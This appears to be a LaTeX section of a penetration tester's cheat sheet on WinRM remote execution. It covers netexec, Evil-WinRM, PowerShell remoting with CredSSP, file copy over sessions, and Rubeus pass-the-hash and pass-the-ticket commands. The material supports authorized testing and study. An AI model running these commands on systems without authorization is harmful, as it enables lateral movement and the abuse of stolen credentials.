
\section{Interaction}
\subsection{netexec}

\begin{verbatim}
netexec winrm <ip> -u <user> -p <password> -X "hostname"
\end{verbatim}

\subsection{Evil-WinRM}
See~\ref{tool:evil-winrm}

\verb+evil-winrm -i <target-IP> -u <username> -p <password>+

\subsection{PowerShell}
See~\ref{tool:wlol:powershell:cmdlet:winrm-session}

Note: Keep in mind that using \verb+-Authentication Negotiate+ will select either Kerberos or NTLM as the underlying authentication mechanism based on what both the client and server support and prefer. It is good to use this flag if we are having authentication issues.

try with target fqdn

\subsubsection{Invoke-Command}

\begin{verbatim}
Copy-Item `
    -ToSession <sessionVariable> `
    -Path '<local_path>' `
    -Destination '<remote_path>' -Verbose

Copy-Item `
    -FromSession <sessionVariable> `
    -Path '<remote_path>' `
    -Destination '<local_path>' -Verbose


\end{verbatim}

\subsubsection{Invoke-Command}

{\bf Note: If IP is used  instead of the computer name, explicit credentials, or alternatively, \verb+-Authentication Negotiate+ instead of providing explicit credentials must be used}

\begin{verbatim}
Invoke-Command -computername <target_name> `
    -ScriptBlock {<cmd|hostname>} ` 
    -Credential (
        New-Object System.Management.Automation.PSCredential(
            "domain_netbios>\<user>", 
            (ConvertTo-SecureString 
                '<password>' -Asplaintext -force)))
     -Authentication 'Credssp'
\end{verbatim}


\subsubsection{PSSession}
\begin{verbatim}
$password=ConvertTo-SecureString '<password>' -Asplaintext -force;
$creds=New-Object System.Management.Automation.PSCredential("domain_netbios>\<user>", $password);

$sess = New-PSSession -ComputerName <target_name> `
    -Credential $creds -Authentication 'Credssp' `
    -SessionOption (New-PSSessionOption `
    -ProxyAccessType NoProxyServer) 

    Enter-PSSession $sess
\end{verbatim}

\begin{verbatim}
$password=ConvertTo-SecureString '<password>' -Asplaintext -force;
$creds=New-Object PSCredential("domain_netbios>\<user>", $password);

Register-PSSessionConfiguration -Name <config_name>  -RunAsCredential $creds
Restart-Service WinRM
Enter-PSSession -ComputerName <target_name>' `
    -Credential $creds -Authentication 'Credssp' `
    -ConfigurationName <config_name>
\end{verbatim}



\href{https://learn.microsoft.com/en-us/powershell/module/microsoft.wsman.management/enable-wsmancredssp?view=powershell-7.4}{Enable-WSManCredSSP}

\href{https://www.techtarget.com/searchwindowsserver/tutorial/How-to-avoid-the-double-hop-problem-with-PowerShell}{How to avoid the double-hop problem with PowerShell}


\subsubsection{PTH / PTT}
\begin{verbatim}
Rubeus.exe asktgt /user:<user> /rc4:<hash> /nowrap
Rubeus.exe createnetonly /program:powershell.exe
Rubeus.exe ptt /ticket:<ticket_b64>
Enter-PSSession <target_fqdn> -Authentication Negotiate
\end{verbatim}
